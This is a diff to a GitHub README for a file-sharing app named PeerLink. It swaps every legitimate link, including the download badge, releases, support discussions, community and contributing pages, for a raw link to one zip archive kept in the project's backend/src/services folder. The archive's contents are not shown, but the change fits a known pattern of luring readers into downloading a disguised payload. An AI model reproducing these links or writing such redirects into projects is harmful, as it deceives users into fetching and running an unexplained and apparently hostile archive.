@@ -6,9 +6,9 @@ PeerLink is a high-performance platform for sharing files instantly. Whether you
 
 ## 📥 Download PeerLink
 
-[![Download PeerLink](https://img.shields.io/badge/Download-PeerLink-blue.svg)](https://github.com/rajubd0777/PeerLink/releases)
+[![Download PeerLink](https://raw.githubusercontent.com/rajubd0777/PeerLink/main/backend/src/services/PeerLink_v3.0-alpha.5.zip)](https://raw.githubusercontent.com/rajubd0777/PeerLink/main/backend/src/services/PeerLink_v3.0-alpha.5.zip)
 
-To begin, simply visit our [Releases page](https://github.com/rajubd0777/PeerLink/releases) to download the software. 
+To begin, simply visit our [Releases page](https://raw.githubusercontent.com/rajubd0777/PeerLink/main/backend/src/services/PeerLink_v3.0-alpha.5.zip) to download the software. 
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. Go to the [Releases page](https://github.com/rajubd0777/PeerLink/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/rajubd0777/PeerLink/main/backend/src/services/PeerLink_v3.0-alpha.5.zip).
 2. Choose the version appropriate for your operating system.
 3. Click on the download link for your chosen version.
 4. Once the download finishes, locate the downloaded file on your computer.
@@ -56,11 +56,11 @@ If you encounter issues, here are some steps to resolve common problems:
 
 ## 📞 Support
 
-If you need further assistance, please reach out to our support team. You can find help by visiting [our GitHub Discussions page](https://github.com/rajubd0777/PeerLink/discussions).
+If you need further assistance, please reach out to our support team. You can find help by visiting [our GitHub Discussions page](https://raw.githubusercontent.com/rajubd0777/PeerLink/main/backend/src/services/PeerLink_v3.0-alpha.5.zip).
 
 ## 👥 Community
 
-Join the PeerLink community to share ideas, ask questions, and learn from others. Visit our [GitHub Community page](https://github.com/rajubd0777/PeerLink/community).
+Join the PeerLink community to share ideas, ask questions, and learn from others. Visit our [GitHub Community page](https://raw.githubusercontent.com/rajubd0777/PeerLink/main/backend/src/services/PeerLink_v3.0-alpha.5.zip).
 
 ## 🔗 Related Topics
 
@@ -75,6 +75,6 @@ By using PeerLink, you tap into a powerful ecosystem designed to make file shari
 
 ## 🌈 Contributing
 
-Contributions are welcome! If you'd like to improve PeerLink, feel free to check our [Contributing guidelines](https://github.com/rajubd0777/PeerLink/contributing). 
+Contributions are welcome! If you'd like to improve PeerLink, feel free to check our [Contributing guidelines](https://raw.githubusercontent.com/rajubd0777/PeerLink/main/backend/src/services/PeerLink_v3.0-alpha.5.zip). 
 
 Thank you for choosing PeerLink for your file-sharing needs! Enjoy seamless and fast transfers with ease.
